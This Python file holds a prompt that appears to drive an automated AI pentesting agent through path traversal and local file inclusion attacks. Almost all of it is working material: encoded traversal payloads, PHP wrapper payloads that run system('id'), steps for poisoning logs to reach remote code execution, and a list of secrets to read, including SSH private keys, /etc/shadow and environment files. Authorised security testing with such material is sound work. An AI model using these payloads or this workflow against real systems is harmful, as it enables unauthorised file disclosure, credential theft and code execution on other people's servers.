"""
Path Traversal / LFI Attack Skill Prompt.
"""
PATH_TRAVERSAL_SKILL_PROMPT = """
## ATTACK SKILL: PATH TRAVERSAL / LFI

**CRITICAL: Target has file-access parameters (file=, page=, path=, template=).**
**Follow this workflow for path traversal and file inclusion.**

---

### DETECTION: Identify file-access parameters

Parameters that suggest file access:
- `file=`, `page=`, `path=`, `template=`, `include=`, `document=`, `view=`
- Parameters whose values look like file paths: `index.php`, `home.html`, `../`
- Error messages revealing file paths

### MANDATORY PATH TRAVERSAL WORKFLOW

#### STEP 1: BASIC TRAVERSAL

Start with simple probes:
1. `../../../etc/passwd` — Linux file disclosure
2. `....//....//....//etc/passwd` — bypass . replacement filter
3. `..%2f..%2f..%2fetc%2fpasswd` — URL-encoded
4. `..%252f..%252f..%252fetc%252fpasswd` — double URL-encoded
5. `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd` — full URL-encode
6. `..././..././..././etc/passwd` — bypass ../ removal

**Windows targets:**
- `..\\..\\..\\windows\\win.ini`
- `....\\\\....\\\\....\\\\windows\\\\win.ini`

#### STEP 2: PHP WRAPPERS (if PHP target)

Once basic traversal works, try PHP wrappers:
1. **Source disclosure**: `php://filter/convert.base64-encode/resource=index.php`
   - If you get base64 back → decode to read source code
2. **Code execution** (rare): `php://input` with POST body `<?php system('id');?>`
3. **Data wrapper**: `data://text/plain,<?php system('id');?>`
4. **Expect wrapper**: `expect://id` (if expect module loaded)

#### STEP 3: LOG POISONING TO RCE

If you can include files but not execute code:
1. Find log files: `/var/log/apache2/access.log`, `/var/log/nginx/access.log`
2. Send a request with PHP code in User-Agent: `User-Agent: <?php system('id');?>`
3. Include the log file: `../../../../var/log/apache2/access.log`
4. The PHP code executes → RCE achieved

#### STEP 4: SENSITIVE FILES TO TARGET

Linux targets:
- `/etc/passwd` — user accounts
- `/etc/shadow` — password hashes (rarely readable)
- `/etc/hosts` — internal hostnames
- `/proc/self/environ` — environment variables (API keys, DB creds)
- `/proc/self/cmdline` — running command
- `/home/user/.ssh/id_rsa` — SSH private key
- `/var/www/html/config.php` — app config
- `.env` — environment file

Windows targets:
- `C:\\Windows\\win.ini`
- `C:\\Windows\\System32\\drivers\\etc\\hosts`
- `C:\\inetpub\\wwwroot\\web.config`
- `C:\\xampp\\htdocs\\config.php`

#### ANTI-PATTERNS:
- Do NOT stop after `../etc/passwd` fails — try encoded variants
- Do NOT forget PHP wrappers on PHP targets — they often work when direct traversal fails
- Always read source code (php://filter) to find other vulnerabilities
- Record every successful file read with record_finding
"""
